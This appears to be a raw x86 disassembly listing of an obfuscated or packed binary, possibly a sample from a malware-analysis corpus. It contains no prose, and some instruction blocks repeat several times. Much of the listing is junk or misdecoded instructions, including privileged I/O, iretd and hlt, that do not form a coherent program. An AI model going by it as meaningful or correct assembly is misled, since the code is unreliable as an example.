xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10146b03
pushad
jpe rwxdata
jns rwxdata
or bl [ edx ]
iretd
mov ah 0xc5
jl rwxdata
push esp
stosb [ edi ]
pop ebp
sahf
ror esp cl
fmul [ ecx ]
mov es [ ecx + 0x1fd2ecc7 ]
and bl [ ebp - 0x62 ]
outsb
sub [ ebx + edx * 2 ] 0x64
mov eax [ 0xffffffffd10df69e ]
loop rwxdata
mov [ 0xffffffffce88165b ] eax
out 0xd8 eax
sub al 0xe1
jbe rwxdata
mov ah 0xf
scasd [ edi ]
sbb al 0x6e
loope rwxdata
cwde
xchg ebx eax
mov ebx edi
fadd [ edx - 0x3f02a644 ]
jecxz rwxdata
cmpsb [ esi ] [ edi ]
inc eax
jg rwxdata
call 0x80c8168b
out dx eax
sbb esp ebx
add ebx ebx
or esi [ ebp + eax * 8 + 0xfb4a37c ]
sub al 0xcf
jle rwxdata
dec edi
cmp dl dh
in al dx
jne rwxdata
push esp
and eax 0xfa4d1b1e
sbb eax 0xb034e0bf
mov ss [ ebx ]
mov ebx [ ecx + edi * 2 + 0x29753205 ]
mov al 0xbe
rol [ edx + edi * 4 ] 0xc5
ficomp [ ebx - 0x1d ]
clc
out 0x21 al
mov esi 0xa14fa65
sbb al 0x62
pop ds
fnstcw [ edx - 0x33 ]
jno rwxdata
fbld [ esp + ebp * 8 + 0x6 ]
out 0x2b eax
xchg edx eax
xchg ecx eax
lodsd [ esi ]
dec edx
std
cli
and eax 0x8b939836
fbld [ esi - 0x28 ]
cmp [ ecx + ebx * 2 - 0x151c3f03 ] 0x54
mov edi 0x8eb034e0
adc ecx [ ebx + 0x3205799c ]
jne rwxdata
add [ ebp + 0x2579e1bd ] ebx
mov dl 0x23
inc esi
mov ebp 0x1a47b72d
jmp 0x23c0b5b0
pushad
xor [ edi + eax * 2 ] ecx
cmp al 0xb1
in eax dx
test cl 0x1e
fiadd [ edx - 0x70 ]
mov edx 0xaf9e219a
pushfd
mov [ esp + 0xc ] ah
mov [ esp + 0x24 ] edi
call sub_10202ec8
pop ebx
popad
jge rwxdata
adc cl ch
cmc
stosb [ edi ]
mov ebx 0x42776771
dec ebp
xchg ebp eax
jo rwxdata
clc
fdiv [ ebp - 0x75 ]
scasd [ edi ]
cmc
jmp rwxdata
sub_10146fce
lea esp [ esp + 0x4 ]
jb rwxdata
clc
call sub_1014720b
cmp al 0x9
jmp rwxdata
call sub_10156d61
pop esi
cmp [ ebx + eax * 2 + 0x5c ] 0xf7
dec eax
pop ecx
in eax 0x72
mov esp 0x627cb98f
cmp al 0x62
jns rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
dec edi
push 0x85c27cb6
cli
mov bl 0x52
loope rwxdata
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
jae rwxdata
jg rwxdata
sub eax edx
arpl [ edx - 0x20 ] sp
mov ss [ edi + 0x7 ]
sbb edi [ ecx - 0x64a653bb ]
push 0x7c
inc ebx
pop ebx
and al 0x78
dec ebx
mov edx 0x8becfdfb
shl ah 0x1
add al 0xdb
inc [ eax + 0x56bdde91 ]
or cl [ ecx ]
loope rwxdata
inc esp
jpe rwxdata
jmp rwxdata
add edx 0x532c0ffa
hlt
clc
sub bh dh
popad
mov [ 0xffffffffa5c3b28d ] al
mov ecx 0x36632114
mov ss [ ecx - 0x72 ]
loop rwxdata
fnstenv [ edx + 0x5f40dffd ]
mov eax [ 0xffffffffae3469c1 ]
push eax
pop es
js rwxdata
and [ ebx - 0x57c838bd ] edi
fwait
cmp [ esi - 0x60478879 ] al
sbb ebp [ eax + 0x16 ]
cmp eax 0xa865a02
shl [ eax ] 0x7c
fwait
or [ edx ] esi
lahf
sbb al 0x70
cpuid
mov ecx 0xfae5914e
and [ esi - 0x14 ] bl
jae rwxdata
call 0x1b101833
jne rwxdata
sub al 0x4f
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
retn
sub al 0xf2
and [ 0xffffffffe17debaa ] esi
jne rwxdata
jns rwxdata
pop ecx
xchg esi eax
sub [ ecx ] dh
sub eax 0xf2f06b9
inc edi
clc
jmp 0xffffffffe34f14f4
shr [ edi + 0x1cdb64f0 ] 0x1
mov eax 0xf65b9f06
ror [ eax - 0x1338c82a ] 0x1
xor bh [ ebx + 0x5589603e ]
or al 0x72
push esp
stosb [ edi ]
scasd [ edi ]
scasd [ edi ]
mov esi ebx
add al 0x75
or [ edx ] ebx
xlat
xchg [ esi ] esp
fistp [ edx + eax * 2 ]
adc al 0x2b
cmp al 0xb6
dec edi
inc ecx
mov ecx 0xbb21106e
inc ebx
jbe rwxdata
pop eax
out 0xf8 eax
add dh bl
cli
int 0x6
test al 0xe1
add [ eax * 2 - 0x40596acc ] eax
jno rwxdata
dec ebp
mov bh 0xe7
fsubrp st0
xor al 0x99
movsd [ edi ] [ esi ]
jb rwxdata
arpl [ esp + edx * 4 - 0x36 ] si
push 0xc8b7c8d6
hlt
add bl [ edx - 0x7a ]
or al cl
xor [ ebx + ebx * 4 + 0x9 ] bh
xor bl [ edi - 0x5df08fe4 ]
std
ror [ eax ] 0xf6
pop es
jno rwxdata
cdq
sahf
cdq
and eax 0x81f628b9
fsubp st7
cmc
dec ecx
iretd
mov ebp 0x57a96a55
cdq
add eax 0x1d82e2bd
sbb [ cs : ebp - 0x1302dcc5 ] 0x8c
or edi [ ecx - 0x21ce221f ]
adc [ edi + 0xab4e400 ] ebx
sbb eax ebx
cmp al 0x3
adc al 0xe5
jb rwxdata
jle rwxdata
jmp rwxdata
test [ edx + eax * 2 + 0x5f ] edi
aas
scasb [ edi ]
add bl [ ebp + ebx * 8 - 0x1b13dfec ]
loopne rwxdata
int3
xchg [ ecx - 0x590b635d ] bh
cmp eax 0x7b8f2c18
or al [ esi - 0xa ]
mov dh 0xd9
lds ebx [ ecx - 0x7d1d42fb ]
sbb eax 0x2d1c822e
cmp esp [ ebx ]
std
in al dx
mov [ ebx ] cs
mov ecx 0xde31dde1
pop ss
pop eax
pop edx
mov esi 0x7c56027d
cmp al 0x82
shr [ esi + 0x30 ] 0x1
dec edi
jbe rwxdata
jne rwxdata
dec eax
pop ecx
cmovg eax ebx
fwait
idiv ebx
inc ebx
mov [ 0xffffffffc248f71c ] eax
sbb eax 0x3fbf4e30
mov [ 0xffffffff9e99867c ] al
mov [ ecx ] esp
cmp eax 0x64ccd27e
mov eax [ 0xffffffffafd0ced0 ]
std
or dl ch
sbb al 0xe9
cli
lds ebp [ ecx ]
adc eax 0x819d71ed
stc
jge rwxdata
shr [ esi + 0x7f ] 0x1
jno rwxdata
push ebp
hlt
sub_10147215
sub ecx ebx
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
call sub_101443dc
jmp rwxdata
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1014781a
call sub_1020a29f
jno rwxdata
out 0x38 eax
mov bl 0x6c
jge rwxdata
mov ecx esp
mov bl 0x3e
popad
fucomp st6
daa
push edi
imul eax [ ebx + 0x3c ] 0x7d
xor [ esi + 0x5f ] ecx
mov dh 0xc8
mov edx 0xe49b9c91
cmc
clc
dec edi
pop ds
pop edi
xchg esp eax
insd
jmp 0xffffffffa1ce1f05
sub_1014799f
mov [ esp ] dh
ror al 0x6
test bh cl
mov [ esp ] bl
xor al 0x72
test al 0x1d
cmc
mov [ ecx ] al
pushfd
push [ esp ]
push 0x92d84df0
add ecx 0x1
stc
mov [ esp ] 0xdd
test ah ah
jmp rwxdata
lea esp [ esp + 0x34 ]
jne rwxdata
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
call sub_10146b03
fstp [ ebp + 0x4161dd01 ]
popfd
scasb [ edi ]
push 0xffffff90
sbb edi [ edx ]
push cs
cmp eax 0x161965c1
or [ ebp + 0x6b5fe0b2 ] ebp
mov bl 0x5f
dec [ eax ]
xlat
add edi [ ebx + eax * 2 + 0x5c ]
xlat
mov dh ah
fsubr st2
aam 0xf1
int 0xde
outsb
adc [ ecx ] ah
sub_10147cf1
call sub_102055d7
cmp [ ecx ] bh
inc esi
sahf
std
arpl [ ecx + esi * 8 + 0x502e0856 ] bp
cwde
xlat
sub [ eax ] ah
jpe rwxdata
sahf
test [ ecx + 0x2995e9d6 ] edi
mov edx 0x37aad505
out 0xf8 eax
sub dh dh
pop es
loope rwxdata
scasb [ edi ]
jpo rwxdata
push ebx
lodsb [ esi ]
sub eax 0x6239450d
sbb eax 0x732b4678
or al 0x93
out 0x78 eax
bound edi [ ebp - 0x70 ]
outsb
call 0xffffffffa4cde3f3
0xe4faef6f 0xdde1
jb rwxdata
out 0x98 al
jb rwxdata
and eax 0x4332ad1a
mov ecx 0xf42aa07f
add eax 0xac63fd95
int1
push esi
or [ esi ] ch
push eax
int3
xor [ 0xffffffff82427d39 ] al
sub [ edi - 0x55ba590 ] 0xffffff85
cmp eax 0x2e77e862
mov al 0xe5
fldlg2
rcl [ ebx ] cl
jno rwxdata
mov ch 0x8a
fwait
std
loope rwxdata
fmul [ ebx ]
add [ eax ] bh
cmp [ esi + 0x67 ] eax
sahf
jb rwxdata
lodsd [ esi ]
xor [ ebx - 0x54 ] dl
leave
add [ esi - 0x41 ] bh
ror [ edi - 0x30af20c0 ] 0xc4
pushfd
call 0xffffffffe0fd8547
or dh [ 0xffffffffee9127eb ]
das
pop ebp
test al 0x8a
mov ah 0xc9
mov ch 0x9
cmp al 0x77
cdq
inc esi
jns rwxdata
0xa5 0xe85e
cmpsb [ esi ] [ edi ]
push esi
sahf
xchg [ ecx ] bh
stosb [ edi ]
adc eax 0x7837f689
0x450d2dd3 0x6239
sub_10147e35
lahf
mov [ esp ] 0xb
movzx eax bl
pushad
setbe ah
lea eax [ edi * 4 - 0x4a5a1df7 ]
lea eax [ rwxdata ]
jmp rwxdata
mov [ esp ] 0x93
mov [ esp + 0x1c ] rwxdata
pushad
push [ eax ]
pop [ esp + 0x38 ]
push [ esp ]
mov [ esp ] 0x7b
pushfd
push [ esp + 0x40 ]
retn 0x44
sub_10147f31
push esp
mov al 0x10
lea esp [ esp + 0x4c ]
pushad
pushfd
push [ esp ]
push edi
lea esp [ esp + 0x2c ]
call sub_101ffc63
call sub_10209cf2
cmp ebx [ edx + 0x45 ]
out dx al
jno rwxdata
pop eax
mov [ edi ] 0x3f
[ ebx + 0x2e796453 ]
popad
mov [ 0x5da63227 ] al
fmul [ esi ]
jmp rwxdata
cmpsb [ esi ] [ edi ]
pop ebp
stosb [ edi ]
jne rwxdata
mov cl 0xa8
mov dh 0xe8
xchg edi eax
jbe rwxdata
mov dl 0xcc
mov ah 0x1b
sbb ah bl
push ds
cmpsd [ esi ] [ edi ]
insb
les edx [ edi - 0x5ba0f3df ]
fmul [ esi ]
jpe rwxdata
xor [ esi ] cl
pop ds
inc esi
stc
and eax 0x5ecfc5f8
mov [ esi - 0x27849729 ] dl
fxch st5
nop
mov ds [ edi + 0x57e861a1 ]
lodsb [ esi ]
rcr [ ecx + 0x25 ] 0x4c
push edx
inc al
ror ch cl
sbb al 0xc2
dec eax
xchg edi eax
sub_10148370
lea esp [ esp + 0x44 ]
ja rwxdata
jae rwxdata
jmp rwxdata
push 0xf5564d03
cmp ecx [ ebp - 0x4 ]
call sub_1014be53
call sub_10201415
push ecx
mov ah 0x6b
lahf
pop edi
xor [ edi - 0x138e0760 ] cl
dec eax
add [ ebx + 0xc ] dh
scasb [ edi ]
jo rwxdata
stc
cmp ecx [ ebp - 0x4 ]
push ebp
call sub_10204bf9
mov dh 0x97
enter 0xa41b 0x4d
mov eax 0x497d460c
fsubr [ eax + ebx * 8 + 0x67 ]
in al dx
push ebx
mov ebx 0xff7f6063
mov edi 0x9c42603f
stosd [ edi ]
aam 0x2c
0x26f9e894 0x86c1
jmp rwxdata
pop es
adc al 0xb5
enter 0xc01e 0xb7
pushfd
pushfd
lea esp [ esp + 0x8 ]
jb rwxdata
scasd [ edi ]
mov eax 0x9e830ee4
xchg esp ecx
mov dh 0x98
pop edi
pop esi
enter 0xc63 0x54
das
cmpsb [ esi ] [ edi ]
sar [ ebx + 0x144e5b7 ] cl
aaa
inc edi
mov [ 0xffffffff85b3a7b5 ] al
0x606d
sbb bl [ ecx - 0x7b ]
aaa
dec esp
dec ebx
push esp
outsd
jo rwxdata
clc
call sub_1014720b
cmp al 0x9
jmp rwxdata
cmc
cmp cl cl
cmp [ edi - 0x1 ] 0x0
jmp rwxdata
test al 0x22
cld
push ss
dec eax
xor cl [ esi + esi * 2 + 0x48 ]
xchg ebp eax
or [ edx + 0x2d ] esi
xchg edx eax
or eax 0x30affd22
test edx eax
jl rwxdata
cmp eax 0xb7c01ec8
test esp esi
push ecx
in eax dx
inc ecx
les ecx [ edi + 0x6b03823c ]
xor al 0x9b
stosd [ edi ]
jle rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
mov ch 0x71
pop ebx
in eax dx
pop edi
xor [ ebx ] bl
jecxz rwxdata
fdiv st3
sub al 0x81

inc edi
pop eax
mov es cx
or dh [ esp + edx * 4 - 0x4aebf804 ]
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
call sub_101153b8
add di cx
xor di si
mov edi [ edx + 0x24 ]
pushfd
mov [ esp ] dh
push esp
add edi eax
bt esi esp
call sub_101466a1
jpo rwxdata
btc ebx ebx
pushfd
mov ebx eax
jmp rwxdata
jmp rwxdata
xor ch dl
jle rwxdata
cmp [ ecx - 0x6b ] cl
scasb [ edi ]
popfd
out dx eax
push 0x37
xchg ecx eax
pushfd
mov edi 0x29ad9c83
push ds
ror [ 0x42f0b25e ] 0x1
push es
sub [ 0x59851302 ] edi
fisubr [ ecx - 0xd ]
add eax 0x44b5921b
0xc7029d85 0x4b73
clc
cmp al 0xaf
cmp [ edi ] 0x23
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
xchg edi eax
add [ ebx ] 0x2f
scasd [ edi ]
cmp al 0x8f

xchg ebx eax
loope rwxdata
push cs
mov dl 0x6c
mov ebx 0x39e45bec
loopne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
sar ax 0xd
bts ax 0x1
sub edx edx
movsx ax bl
daa
sbb ax dx
aas
mov eax edx
dec al
test bl 0xe2
or al cl
add edi 0x1
and al 0x5f
adc al 0xd7
mov al [ edi ]
cmp eax edx
test al al
jmp rwxdata
les edi [ edx - 0x5f50611f ]
mov dl 0x1e
fiadd [ ecx + 0x22ea95aa ]
xchg dl ch
xchg esp eax
jmp 0xffffffff9c0c8ab9
inc [ edi - 0x68 ]
sbb eax esp
mov edx 0xcc1e7f74
jg rwxdata
inc edi
cwde
je rwxdata
retn 0xc391
sti
dec eax
xchg ebp eax
mov edx 0x838ad5a5
jpo rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
stc
jmp rwxdata
clc
stc
sub al 0x30
call sub_1014781a
sub_101491f0
mov [ esp ] esi
inc si
test sp bp
and si cx
mov esi edi
cmc
clc
sub esi eax
pushfd
push 0x7016da35
jmp rwxdata
pushfd
[ edi ] [ esi ]
call sub_1020798c
fimul [ edx ]
adc al 0x12
insb
retn
sub_101492d1
lea esp [ esp + 0x44 ]
ja rwxdata
clc
pushfd
clc
call sub_102010f5
rcl edi 0xe7
nop
iretd
or al al
pushfd
neg al
sub ebx edi
sub al 0xaf
bsf edi ecx
add esp 0x4
add ebx esp
and al 0xa5
rol edi cl
sub di di
mov edi ebx
cmc
sbb al 0x6
pushad
pushad
mov al 0x2e
push 0x4f647013
[ edi ]
jmp rwxdata
push [ esp + 0x10 ]
lea esp [ esp + 0x48 ]
jne rwxdata
push edi
pushad
call sub_10201207
lea eax [ ebp - 0x62f95414 ]
setns al
pushad
mov [ esp + 0x8 ] 0xdc6
mov [ edi - 0x1 ] 0x0
sete al
push [ esp ]
movsx ax al
mov [ esp + 0x20 ] ebx
call sub_10119014
or eax 0x233c3b43
pop eax
inc edi
pop eax
dec ebp
mov cl 0xb2
sub [ edx + 0xc730048 ] 0x68d65c62
xor ecx [ ebp + 0x60 ]
imul [ eax - 0x39 ]
pop eax
sti
inc esp
mov [ 0xfffffffff2403e3c ] al
dec esp
0x607fa594 0x48cf
sub_10149912
pushfd
lea esp [ esp + 0x4c ]
jne rwxdata
movsx dx al
je rwxdata
mov ch ch
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov ecx edi
sbb si 0xcae8
sub ecx ebx
mov esi ecx
movsx si dl
mov esi esp
clc
pushfd
clc
call sub_102010f5
rcl edi 0xe7
nop
iretd
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1014a977
push esi
lea esp [ esp + 0x2c ]
ja rwxdata
call sub_1014b8bc
sets bl
stosb [ edi ]
not bl
jmp sub_101446ea
je rwxdata
rol bx cl
mov bl 0xb6
test dh dh
btc bx dx
mov bx [ esi ]
clc
stc
jmp rwxdata
stc
push 0xa15dc1c7
call sub_1011dfd8
adc al 0x18
inc esi
rcr [ esi ] 0x8f
jbe rwxdata
jmp rwxdata
frstor [ ecx ]
into
push ecx
sub [ esi ] esi
mov bl 0x2b
sub al 0xcb
or dl [ edi + 0x60 ]
call 0xfffffffff7ac8d02
mov ah 0xcb
jmp rwxdata
and ebx 0xfff
bt dx sp
jmp rwxdata
dec edi
jo rwxdata
pushfd
bt bp sp
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
mov ss [ esi + 0xb ]
loop rwxdata
sbb [ edi - 0x567999a2 ] bl
dec ecx
adc eax 0x9cc08b6a
mov [ 0xffffffffcb7649b7 ] eax
and ebx [ edi + ebx ]
sub [ eax + ebx * 8 - 0x45 ] bl
je rwxdata
jmp rwxdata
or [ 0x47e996c1 ] bl
mov esi 0xf3cbca74
xor al 0x18
ja rwxdata
or eax 0x3c0302f1
push ss
inc ebx
sbb edx esi
leave
shr ebp 0x1
sbb ebp 0xcf6fc679
loopne rwxdata
xor al 0xf8
add esi 0x2
jmp rwxdata
lodsb [ esi ]
[ esi ]
push esi
inc edx
loope rwxdata
adc [ ebp - 0x3bcc9312 ] ebp
mov edx [ esi - 0x206dae72 ]
sar [ edi ] 0xc
sub al 0x19
and eax 0xc07b2436
xchg esi ebp
sub al 0xb3
les ebp [ ebp + 0x250241f2 ]
inc eax
add dh [ edx - 0x2e ]
push esp
call 0x78d72e00
dec ecx
hlt
push edx
add al 0x9b
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
xchg [ edx + 0x6d ] dh
adc [ ebp - 0x37487842 ] ebp
hlt
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_1014ae6c
pushad
mov [ esp ] si
mov [ esp ] bl
lea esp [ esp + 0x28 ]
jbe rwxdata
movsx dx al
je rwxdata
push ecx
push [ esp ]
test cl 0x34
sub ecx 0x1
stc
add si 0x89b6
mov [ ebp - 0x4 ] ecx
xadd ecx esi
shl ecx 0x2
inc ch
mov ecx [ ebp - 0x8 ]
shrd si bx 0x7
pop esi
add ecx [ ebp - 0x4 ]
stc
shr ecx 0x1
shl di 0xf
not si
mov edi [ ebx + ecx * 4 ]
movsx si dl
add edi eax
pop esi
movsx si bl
pushad
call sub_10115727
mov bl [ edi + 0x7dc02a0 ]
mov eax 0xd3859927
fimul [ ecx - 0x38 ]
and [ esi - 0x48 ] 0x33
in al dx
mov dl 0xec
mov edx esp
sbb ah 0x15
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
